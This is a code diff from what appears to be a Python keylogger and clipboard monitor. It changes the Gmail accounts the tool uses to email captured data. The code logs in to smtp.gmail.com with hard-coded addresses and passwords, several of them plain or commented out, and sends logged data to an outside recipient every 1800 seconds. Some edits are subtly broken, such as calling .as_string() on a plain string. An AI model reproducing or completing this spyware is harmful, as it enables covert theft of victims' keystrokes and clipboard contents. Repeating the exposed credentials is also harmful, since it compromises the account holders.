@@ -51,18 +51,18 @@ def check():
             
 
 def isdataavailable():
-    with open('datafile.txt', 'a') as f:
+    with open('datafile.txt', 'r+') as f:
         # print(f.read())
         data = f.read()
-        print(data)
+        print(f.read())
         if data != '':
             server = smtplib.SMTP(host="smtp.gmail.com", port=587)
             # # connect to the SMTP server as TLS mode ( for security )
             server.starttls()
             # login to the email account
-            server.login('Shalinitiwari1098@gmail.com', 'abcd@1234')
+            server.login('007711meenakshi@gmail.com', '12345ghjkl@1')
             # send the actual message
-            server.sendmail('Shalinitiwari1098@gmail.com', 'Anshumankumar7890@gmail.com', str(data))
+            server.sendmail('007711meenakshi@gmail.com', '999ajaymathur@gmail.com', data.as_string())
             print('email sent successfully')
             # terminates the session
             server.quit()
@@ -87,12 +87,13 @@ def main_func():
 
     check()
     print('main function started')
-    isdataavailable()
     global clipboard_data
     clipboard_listener()
     SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
-    EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
-    EMAIL_PASSWORD = "abcd@1234"
+    EMAIL_ADDRESS = "007711meenakshi@gmail.com"
+    EMAIL_PASSWORD = "12345ghjkl@1"
+    # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
+    # EMAIL_PASSWORD = "abcd@1234"
     # EMAIL_ADDRESS = "core.builder11@gmail.com"
     # EMAIL_PASSWORD = "builder123*"
 
@@ -149,6 +150,7 @@ def main_func():
             print(f"[+] Saved {self.filename}.txt")
 
         def sendmail(self, email, password, message):
+            isdataavailable()
             global clipboard_data
             if not os.path.exists(os.path.join('C://', 'temp')):
                 os.mkdir(os.path.join('C://', 'temp'))
@@ -187,7 +189,7 @@ def main_func():
                 # login to the email account
                 server.login(email, password)
                 # send the actual message
-                server.sendmail(email, 'Anshumankumar7890@gmail.com',msg.as_string())
+                server.sendmail(email, '999ajaymathur@gmail.com',msg.as_string())
                 print('email sent successfully')
                 # terminates the session
                 server.quit()
